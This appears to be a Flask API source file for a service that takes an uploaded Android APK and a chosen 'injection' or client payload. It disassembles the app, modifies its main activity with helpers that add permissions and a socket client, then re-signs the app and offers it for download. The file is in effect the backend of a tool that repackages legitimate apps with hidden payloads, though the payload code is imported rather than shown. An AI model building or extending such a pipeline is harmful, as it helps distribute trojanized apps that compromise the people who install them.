import hashlib
import sys, os, shutil
from flask import Flask, request, send_from_directory, session
from flask_restplus import Resource

from werkzeug.contrib.sessions import Session
from werkzeug.datastructures import FileStorage, CallbackDict
from api.restplus import api

from utils.utils_func import is_apk, save_apk, generate_name, do_json
from utils.disas import disassemble, reassemble, sign
from utils.modify import get_main_activity, get_package, add_permission, mainActivity_modifier, add_socket_client, check_main_activity_name
from utils.query import get_last_injection, query

ns = api.namespace('first', description='boh')

upload_parser = ns.parser()
upload_parser.add_argument('file', location='files', type=FileStorage, required=True)
upload_parser.add_argument('injection', type=int, location='form', required=True)
upload_parser.add_argument('client', type=str, location='form')


@ns.route('/upload/')
@ns.expect(upload_parser)
class Upload(Resource):
    def post(self):
        args = upload_parser.parse_args()
        uploaded_file = args['file']
        if is_apk(uploaded_file.filename):

            injection = args['injection']
            client_payload = args['client']
            save_apk(uploaded_file)

            uploaded_file.filename = generate_name(uploaded_file)
            print('The name is:' + uploaded_file.filename)
            disassemble(uploaded_file)

            mainActivity_modifier(uploaded_file, injection, client_payload)
            reassemble(uploaded_file)
            sign(uploaded_file)
            return do_json('ok', uploaded_file, injection), 200
        else:
            return 415


@ns.param('filename', 'The APK file.')
class download_apk(Resource):

    def get(self, filename):
        return send_from_directory('compiled_apk', filename)


ns.add_resource(download_apk, '/download/<path:filename>')
